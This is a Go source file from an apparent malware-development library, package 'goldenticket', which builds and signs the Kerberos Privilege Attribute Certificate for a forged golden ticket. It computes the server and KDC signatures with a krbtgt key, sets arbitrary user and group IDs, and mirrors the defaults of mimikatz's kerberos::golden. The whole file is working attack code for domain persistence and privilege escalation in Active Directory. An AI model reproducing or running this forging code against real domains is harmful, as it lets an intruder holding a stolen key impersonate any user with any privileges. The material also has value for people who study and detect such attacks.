package goldenticket

import (
	"crypto/hmac"
	"crypto/md5"
	"encoding/binary"
	"fmt"
	"strconv"
	"strings"
	"unicode/utf16"

	"github.com/oioio-space/maldev/internal/krb5/crypto"
	"github.com/oioio-space/maldev/internal/krb5/iana/chksumtype"
	"github.com/oioio-space/maldev/internal/msrpc/msrpc/dtyp"
	"github.com/oioio-space/maldev/internal/msrpc/msrpc/dtyp/filetime"
	"github.com/oioio-space/maldev/internal/msrpc/msrpc/pac"
)

// buildPAC assembles a Kerberos PAC (Privilege Attribute Certificate)
// for the forged ticket and returns the complete PAC byte stream with
// both the server signature and the KDC signature filled in.
//
// The signature dance follows MS-PAC § 2.8:
//
//  1. Build the PAC with the two signature buffers populated by
//     placeholder zeros sized for the chosen checksum etype.
//  2. Marshal the entire PAC.
//  3. Zero out both signature data fields in the marshaled bytes.
//  4. Compute the server checksum over the zeroed PAC bytes using the
//     krbtgt key (server == krbtgt for golden tickets).
//  5. FillInSignatureData puts the server checksum into the buffer.
//  6. Compute the KDC checksum over THE SERVER CHECKSUM bytes (just
//     the checksum, not the whole PAC) using the krbtgt key.
//  7. FillInSignatureData puts the KDC checksum into its buffer.
//
// The returned bytes are ready to be embedded in
// EncTicketPart.AuthorizationData as a single AD-IF-RELEVANT entry of
// type AD-WIN2K-PAC.
func buildPAC(p normalizedParams) ([]byte, error) {
	logon, err := buildLogonInfo(p)
	if err != nil {
		return nil, fmt.Errorf("logon info: %w", err)
	}
	client, err := buildClientInfo(p)
	if err != nil {
		return nil, fmt.Errorf("client info: %w", err)
	}

	chkType := pacChecksumType(p.Hash.Type)
	chkLen := pacChecksumLen(p.Hash.Type)
	zeroSig := make([]byte, chkLen)

	pkt := &pac.PAC{
		Version:                        0,
		LogonInformation:               logon,
		ClientNameAndTicketInformation: client,
		ServerChecksum: &pac.PACSignatureData{
			SignatureType: chkType,
			Signature:     append([]byte{}, zeroSig...),
		},
		KDCChecksum: &pac.PACSignatureData{
			SignatureType: chkType,
			Signature:     append([]byte{}, zeroSig...),
		},
	}
	pacBytes, err := pkt.Marshal()
	if err != nil {
		return nil, fmt.Errorf("marshal pass 1: %w", err)
	}

	// Locate the two signature buffers in the marshaled bytes.
	var serverBuf, kdcBuf *pac.PACInfoBuffer
	for _, b := range pkt.Buffers {
		switch b.Type {
		case pacInfoBufferTypeServerChecksum:
			serverBuf = b
		case pacInfoBufferTypeKDCChecksum:
			kdcBuf = b
		}
	}
	if serverBuf == nil || kdcBuf == nil {
		return nil, fmt.Errorf("missing signature buffer (server=%v kdc=%v)", serverBuf, kdcBuf)
	}

	// Step 3: zero out both signature bytes (canonical input to step 4).
	if pacBytes, err = pac.ZeroOutSignatureData(pacBytes, serverBuf); err != nil {
		return nil, fmt.Errorf("zero server sig: %w", err)
	}
	if pacBytes, err = pac.ZeroOutSignatureData(pacBytes, kdcBuf); err != nil {
		return nil, fmt.Errorf("zero kdc sig: %w", err)
	}

	// Step 4-5: server checksum over the zeroed full PAC.
	serverSig, err := pacChecksum(p.Hash, pacBytes)
	if err != nil {
		return nil, fmt.Errorf("server checksum: %w", err)
	}
	if pacBytes, err = pac.FillInSignatureData(pacBytes, serverBuf, serverSig); err != nil {
		return nil, fmt.Errorf("fill server sig: %w", err)
	}

	// Step 6-7: KDC checksum over THE SERVER CHECKSUM BYTES only.
	kdcSig, err := pacChecksum(p.Hash, serverSig)
	if err != nil {
		return nil, fmt.Errorf("kdc checksum: %w", err)
	}
	if pacBytes, err = pac.FillInSignatureData(pacBytes, kdcBuf, kdcSig); err != nil {
		return nil, fmt.Errorf("fill kdc sig: %w", err)
	}

	return pacBytes, nil
}

// PAC info buffer type IDs (MS-PAC §2.4). Mirrored from the vendored
// pac.PAC.Marshal() magic numbers so we can match buffers by type.
const (
	pacInfoBufferTypeLogonInfo      uint32 = 0x00000001
	pacInfoBufferTypeServerChecksum uint32 = 0x00000006
	pacInfoBufferTypeKDCChecksum    uint32 = 0x00000007
	pacInfoBufferTypeClientNameInfo uint32 = 0x0000000A
)

// pacChecksumType returns the IANA checksum-type ID corresponding to
// the krbtgt key etype. Stored as uint32 in PACSignatureData per the
// vendored IDL (KERB_CHECKSUM_HMAC_MD5 = 0xFFFFFF76 = -138 sign-
// extended).
func pacChecksumType(et EType) uint32 {
	switch et {
	case ETypeRC4HMAC:
		return chksumtype.KERB_CHECKSUM_HMAC_MD5_UNSIGNED
	case ETypeAES128CTS:
		return uint32(chksumtype.HMAC_SHA1_96_AES128)
	case ETypeAES256CTS:
		return uint32(chksumtype.HMAC_SHA1_96_AES256)
	default:
		return 0
	}
}

// pacChecksumLen is the byte length of the checksum output for the
// given key etype.
func pacChecksumLen(et EType) int {
	switch et {
	case ETypeRC4HMAC:
		return 16 // HMAC-MD5
	default:
		return 12 // HMAC-SHA1-96 (truncated)
	}
}

// pacChecksum computes the keyed checksum used by the PAC signature
// fields. RC4 path is fully implemented; AES path is stubbed pending
// wire-up to internal/krb5/crypto's RFC 3961 derivation.
func pacChecksum(h Hash, data []byte) ([]byte, error) {
	switch h.Type {
	case ETypeRC4HMAC:
		return rc4PacChecksum(h.Bytes, data), nil
	case ETypeAES128CTS, ETypeAES256CTS:
		return aesPacChecksum(h, data)
	default:
		return nil, fmt.Errorf("unsupported etype %s", h.Type)
	}
}

// rc4PacChecksum implements KERB_CHECKSUM_HMAC_MD5 (-138). Algorithm:
//
//	tmpKey = HMAC-MD5(rc4Key, [usage uint32 LE])
//	output = HMAC-MD5(tmpKey, MD5(data))
//
// Key usage 17 (KERB_NON_KERB_CKSUM_SALT) per MS-PAC §2.8.
func rc4PacChecksum(key, data []byte) []byte {
	const keyUsage uint32 = 17
	usageLE := make([]byte, 4)
	binary.LittleEndian.PutUint32(usageLE, keyUsage)

	mac := hmac.New(md5.New, key)
	mac.Write(usageLE)
	tmp := mac.Sum(nil)

	dataDigest := md5.Sum(data)

	mac2 := hmac.New(md5.New, tmp)
	mac2.Write(dataDigest[:])
	return mac2.Sum(nil)
}

// aesPacChecksum returns the truncated-12 HMAC-SHA1 keyed checksum
// used by AES PAC signatures. Routes through internal/krb5/crypto's
// per-etype GetChecksumHash, which derives the per-usage Kc subkey
// and computes HMAC-SHA1-96 (truncated to 12 bytes) per RFC 3961
// §5.3 and RFC 3962 §3.
//
// Key usage 17 (KERB_NON_KERB_CKSUM_SALT) per MS-PAC §2.8 — same
// usage as the RC4 path.
func aesPacChecksum(h Hash, data []byte) ([]byte, error) {
	const keyUsage uint32 = 17
	et, err := crypto.GetEtype(int32(keyEType(h.Type)))
	if err != nil {
		return nil, fmt.Errorf("get etype %s: %w", h.Type, err)
	}
	sum, err := et.GetChecksumHash(h.Bytes, data, keyUsage)
	if err != nil {
		return nil, fmt.Errorf("checksum hash: %w", err)
	}
	return sum, nil
}

// buildLogonInfo populates the KERB_VALIDATION_INFO PAC section. Only
// the fields required for KDC-side ticket validation are set; the
// rest stay at their zero values, matching mimikatz' default
// kerberos::golden output.
func buildLogonInfo(p normalizedParams) (*pac.KerberosValidationInfo, error) {
	domainSID, err := parseDomainSID(p.DomainSID)
	if err != nil {
		return nil, fmt.Errorf("parse domain SID: %w", err)
	}

	now := filetime.FromTime(p.Now)
	expiry := filetime.FromTime(p.Now.Add(p.Lifetime))
	never := filetime.Never()

	groups := make([]*pac.GroupMembership, 0, len(p.Groups))
	for _, rid := range p.Groups {
		groups = append(groups, &pac.GroupMembership{
			RelativeID: rid,
			Attributes: 0x00000007, // SE_GROUP_MANDATORY|ENABLED_BY_DEFAULT|ENABLED
		})
	}

	const primaryGroup uint32 = 513 // Domain Users; safe default
	_ = expiry                      // currently unused; reserved for KickOffTime tightening

	return &pac.KerberosValidationInfo{
		LogonTime:          now,
		LogoffTime:         never,
		KickOffTime:        never,
		PasswordLastSet:    now,
		PasswordCanChange:  never,
		PasswordMustChange: never,
		EffectiveName:      unicodeStr(p.User),
		FullName:           unicodeStr(""),
		LogonScript:        unicodeStr(""),
		ProfilePath:        unicodeStr(""),
		HomeDirectory:      unicodeStr(""),
		HomeDirectoryDrive: unicodeStr(""),
		LogonCount:         0,
		BadPasswordCount:   0,
		UserID:             p.UserRID,
		PrimaryGroupID:     primaryGroup,
		GroupCount:         uint32(len(groups)),
		GroupIDs:           groups,
		UserFlags:          0x00000020,
		UserSessionKey:     &pac.UserSessionKey{}, // 16 zero bytes for forged tickets
		LogonServer:        unicodeStr(p.Domain),
		LogonDomainName:    unicodeStr(domainShortName(p.Domain)),
		LogonDomainID:      domainSID,
	}, nil
}

// buildClientInfo populates PAC_CLIENT_INFO. ClientID = ticket
// AuthTime; Name = client UPN; NameLength = byte length of Name in
// UTF-16LE. KDC validation rejects mismatch with EncTicketPart's
// CName / AuthTime — keep the buildKirbi side in sync.
func buildClientInfo(p normalizedParams) (*pac.PACClientInfo, error) {
	utf16Name := utf16.Encode([]rune(p.User))
	return &pac.PACClientInfo{
		ClientID:   filetime.FromTime(p.Now),
		NameLength: uint16(len(utf16Name) * 2),
		Name:       p.User,
	}, nil
}

// unicodeStr produces the *dtyp.UnicodeString used by every
// KERB_VALIDATION_INFO string field. Empty strings yield an empty-
// buffer struct, matching the MS-PAC zero-length form.
func unicodeStr(s string) *dtyp.UnicodeString {
	if s == "" {
		return &dtyp.UnicodeString{}
	}
	return &dtyp.UnicodeString{Buffer: s}
}

// domainShortName returns the NetBIOS-style short name of an FQDN by
// taking the first label (CORP.EXAMPLE.COM → CORP). Used only for
// LogonDomainName; KDC validation does not enforce mismatch here, but
// mimikatz's default behavior is to populate it.
func domainShortName(fqdn string) string {
	if i := strings.IndexByte(fqdn, '.'); i > 0 {
		return fqdn[:i]
	}
	return fqdn
}

// parseDomainSID converts a textual SID (e.g. "S-1-5-21-A-B-C") into
// the dtyp.SID structure. Only S-1-5 SIDs (NT Authority) are
// expected — those are the only ones meaningful in a Kerberos PAC.
//
// Format reference: SDDL string form,
// https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/f992ad60-0fe4-4b87-9fed-beb478836861
func parseDomainSID(s string) (*dtyp.SID, error) {
	parts := strings.Split(s, "-")
	if len(parts) < 4 {
		return nil, fmt.Errorf("not enough components: %q", s)
	}
	if parts[0] != "S" {
		return nil, fmt.Errorf("missing S prefix: %q", s)
	}
	rev, err := strconv.ParseUint(parts[1], 10, 8)
	if err != nil {
		return nil, fmt.Errorf("revision: %w", err)
	}
	auth, err := strconv.ParseUint(parts[2], 10, 64)
	if err != nil {
		return nil, fmt.Errorf("authority: %w", err)
	}
	subs := make([]uint32, 0, len(parts)-3)
	for _, sp := range parts[3:] {
		v, err := strconv.ParseUint(sp, 10, 32)
		if err != nil {
			return nil, fmt.Errorf("subauthority %q: %w", sp, err)
		}
		subs = append(subs, uint32(v))
	}
	// IdentifierAuthority is a 6-byte big-endian field. For typical
	// AD SIDs the value is 5 (NT Authority), encoded as
	// {0,0,0,0,0,5}.
	idAuth := make([]byte, 6)
	binary.BigEndian.PutUint32(idAuth[2:], uint32(auth))
	return &dtyp.SID{
		Revision:          uint8(rev),
		SubAuthorityCount: uint8(len(subs)),
		IDAuthority:       &dtyp.SIDIDAuthority{Value: idAuth},
		SubAuthority:      subs,
	}, nil
}
